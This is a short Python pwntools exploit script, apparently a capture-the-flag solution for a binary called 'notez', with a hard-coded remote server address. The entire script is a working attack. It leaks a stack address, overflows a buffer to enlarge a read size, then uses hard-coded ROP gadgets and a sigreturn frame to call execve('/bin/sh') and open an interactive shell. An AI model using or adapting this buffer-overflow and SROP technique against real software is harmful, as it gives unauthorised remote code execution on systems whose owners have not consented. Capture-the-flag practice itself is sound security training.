#!/usr/bin/env python3

from pwn import *

elf = ELF("./notez")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
#context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
'''

domain= "161.97.155.116"
port = 14337

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================

r.recvuntil(b"walkthrough: ")
size_addr = int(r.recvline().strip(),16)
rbp = size_addr

r.info("size_addr: " + hex(size_addr))
r.info("rbp: " + hex(rbp))

pop_rax = 0x00000000004011da
syscall = 0x00000000004011dc
leave_ret = 0x00000000004012cb
buf = 0x0000000000404070
read = 0x0040126c                
binsh = 0x404070

# size enlarging
payload = b"A" * 0x18 + p32(0x340) + b"A"*4
payload += p64(rbp) + p64(read)
assert(len(payload) == 0x30)
r.send(payload)


frame = SigreturnFrame()
frame.rax = 59                              # syscall number for execve()
frame.rdi = binsh                           # pointer to "/bin/sh" 
frame.rsi = 0                               # NULL
frame.rdx = 0                               # NULL
frame.rip = syscall                         # syscall address
frame.uc_flags = syscall
frame.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)
frame = bytes(frame)

payload  = b"/bin/sh\x00" + b"A" * 0x24
payload += p64(pop_rax)
payload += p64(0xf)
payload += p64(syscall)
payload += frame
payload += b"A" * (0x340 - len(payload))

r.send(payload)

r.interactive()
